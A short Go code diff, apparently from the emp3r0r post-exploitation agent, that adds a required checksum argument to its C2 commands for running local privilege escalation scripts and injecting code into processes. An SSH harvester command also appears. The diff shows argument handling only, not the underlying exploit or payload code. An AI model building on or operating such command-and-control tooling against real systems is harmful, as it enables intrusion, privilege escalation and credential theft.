@@ -27,13 +27,14 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		// Usage: !lpe --script_name <script_name>
 		// Runs a Local Privilege Escalation (LPE) script.
 		scriptName := flags.StringP("script_name", "s", "", "Script name")
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		flags.Parse(cmdSlice[1:])
-		if *scriptName == "" {
+		if *scriptName == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
 			log.Printf("%s", out)
 			return
 		}
-		out = runLPEHelper(*scriptName)
+		out = runLPEHelper(*scriptName, *checksum)
 		return
 
 	case emp3r0r_data.C2CmdSSHHarvester:
@@ -51,8 +52,9 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		// Injects code into the specified process using the specified method.
 		method := flags.StringP("method", "m", "", "Injection method")
 		pid := flags.StringP("pid", "p", "", "Process ID")
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		flags.Parse(cmdSlice[1:])
-		if *method == "" || *pid == "" {
+		if *method == "" || *pid == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
@@ -61,7 +63,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		if err != nil {
 			log.Print("Invalid pid")
 		}
-		err = InjectorHandler(int(pidInt), *method)
+		err = InjectorHandler(int(pidInt), *method, *checksum)
 		if err != nil {
 			out = "Error: " + err.Error()
 		}
